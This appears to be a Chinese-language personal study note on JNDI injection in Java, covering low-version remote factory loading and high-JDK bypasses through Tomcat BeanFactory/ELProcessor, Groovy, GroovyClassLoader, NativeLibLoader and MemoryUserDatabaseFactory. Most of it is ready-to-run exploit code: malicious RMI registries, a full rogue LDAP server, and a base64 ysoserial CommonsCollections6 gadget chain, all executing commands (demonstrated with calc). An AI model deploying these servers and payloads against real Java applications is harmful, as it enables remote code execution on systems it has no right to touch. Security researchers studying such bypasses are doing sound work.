# JNDI

## 低版本

在没有绕过高版本得情况下，重点代码在`javax.naming.spi.NamingManager#getObjectInstance()`方法中。
![image-20221218115725756](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202212181157910.png)

跟进发现会将远程类直接进行加载，但是此时会产生报错。我们只要将远程代码修改成如下方式即可。

```java
import java.io.IOException;
import java.util.Hashtable;
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
public class ExecTest implements ObjectFactory {
    public ExecTest() throws IOException,InterruptedException{
        Runtime.getRuntime().exec("calc");
    }


    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return new ExecTest();
    }
}
```

当然在低版本中也有一些需要注意得地方，比如说在复现得时候，我们不能将文件放在同目录下，这样即使不用python启动服务也可以成功弹出计算器。

## 高版本

首先为什么高版本不行？从什么版本开始：RMI是在6u132, 7u122, 8u113版本开始做了限制，LDAP是 11.0.1, 8u191, 7u201, 6u211版本开始做了限制。所以一般能进行jndi攻击，也一般尝试用ldap。
![image-20221218122937087](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202212181229140.png)

在进入NamingManager.getObjectInstance之前进行了if判断。
`var8`自然不为空，trustURLCodebase我们自然也不能修改。
`能操作得地方自然只有var8.getFactoryClassLocation()，让其为空。也就是创建一个Reference并且其classFactoryLocation为空`

### 利用本地工厂

其实细心点可以知道在低版本中，可以触发代码的地方有两处

第一处：factory = getObjectFactoryFromReference(ref, f);

第二处：return factory.getObjectInstance(ref, name, nameCtx,environment);

这里第一处：与var8.getFactoryClassLocation()为空产生了冲突。
`所以我们只能找一个ObjectFactory 类并且其中实现了getObjectInstance方法，并且getObjectInstance方法该方法还必须存在漏洞。`

所以我们找到了如下方法：

#### 依赖与Tomcat

```java
package HighBypass;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class ServerBypass {


    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);

        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "x=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()\")"));

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("aa", referenceWrapper);
    }

}

```

#### 依赖与groovy

```java
public static void main(String[] args) throws Exception {
    System.out.println("Creating evil RMI registry on port 1097");
    Registry registry = LocateRegistry.createRegistry(1097);
    ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
    ref.add(new StringRefAddr("forceString", "x=parseClass"));
    String script = "@groovy.transform.ASTTest(value={\n" +
        "    assert java.lang.Runtime.getRuntime().exec(\"calc\")\n" +
        "})\n" +
        "def x\n";
    ref.add(new StringRefAddr("x",script));

    ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
    registry.bind("evilGroovy", referenceWrapper);
}

```

### Ldap高版本绕过

利用形式：会反序列化参数`javaSerializedData`（需要对方服务器有别的可以攻击的链子）

直接贴代码了：

```java
import java.net.*;
import java.text.ParseException;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;


public class HackerLDAPRefServer {

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void lanuchLDAPServer(Integer ldap_port, String http_server, Integer http_port) throws Exception {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    ldap_port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL("http://"+http_server+":"+http_port+"/#Exploit")));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + ldap_port);
            ds.startListening();
        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            /** Payload1: Return Reference Factory **/
            // e.addAttribute("javaCodeBase", cbstring);
            // e.addAttribute("objectClass", "javaNamingReference");
            // e.addAttribute("javaFactory", this.codebase.getRef());
            /** Payload1 end **/

            /** Payload2: Return Serialized Gadget **/
            try {
                // java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 '/Applications/Calculator.app/Contents/MacOS/Calculator'|base64
                e.addAttribute("javaSerializedData",Base64.decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ADYvQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwL0NvbnRlbnRzL01hY09TL0NhbGN1bGF0b3J0AARleGVjdXEAfgAbAAAAAXEAfgAgc3EAfgAPc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4eA=="));
            } catch (ParseException e1) {
                e1.printStackTrace();
            }
            /** Payload2 end **/

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }

    public static void main(String[] args) throws Exception {

        System.out.println("HttpServerAddress: "+args[0]);
        System.out.println("HttpServerPort: "+args[1]);
        System.out.println("LDAPServerPort: "+args[2]);
        String http_server_ip = args[0];
        int ldap_port = Integer.valueOf(args[2]);
        int http_server_port = Integer.valueOf(args[1]);

        CodebaseServer.lanuchCodebaseURLServer(http_server_ip, http_server_port);
        lanuchLDAPServer(ldap_port, http_server_ip, http_server_port);
    }
}
```

## 本地JDK自带的一些类

通过上面的学习，不难发现我们最后能够触发命令的函数。符合要求的点：

1、该类有无参的构造函数且为public

2、该类的某个方法是public且只接收一个参数，并且该方法能造成漏洞。

### MLet

在loadclass之后没有对其进行实例化，所以不能够造成RCE。
但是其能够进行探测。
在loadclass成功之后，后续在访问URL得时候如果成功访问，那么loadclass得得类就是存在得。（`继hashmap之后又有一种方法可以进行探测对方服务器存在得类`）

### GroovyClassLoader

没去细调
直接上代码：

```java
package HighBypass.GroovyClassLoader;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=addClasspath,b=loadClass"));
        ref.add(new StringRefAddr("a", "http://127.0.0.1:8081/"));
        ref.add(new StringRefAddr("b", "ASTTest"));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("aa", referenceWrapper);
    }
}

```

### SnakeYaml

### Xstream

### MVEL

### NativeLibLoader

上面几种不大想去了解....碰到再说吧。这个比较感兴趣，因为之前做到了动态链接库得题。

```java
package HighBypass.NativeLibLoader;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException, NamingException {
        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);
        ResourceRef ref = new ResourceRef("com.sun.glass.utils.NativeLibLoader", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadLibrary"));
        ref.add(new StringRefAddr("a", "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Java\\dlllibary\\calc"));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("aa", referenceWrapper);
    }
}

```

在调试得过程中发现如下：

![image-20221218161753370](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202212181617518.png)

也就说如下只能在jdk安装目录下进行。如果是windows的话。

### MemoryUserDatabaseFactory

#### xml

```java
package HighBypass.MemoryUserDatabaseFactory;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);
        ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "",
                true, "org.apache.catalina.users.MemoryUserDatabaseFactory", null);
        ref.add(new StringRefAddr("pathname", "http://127.0.0.1:8081/exp.xml"));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("xxe", referenceWrapper);
    }
}

```

#### rce

太懒了 不想去动....

## 参考链接

https://xz.aliyun.com/t/10829#toc-0

https://tttang.com/archive/1405/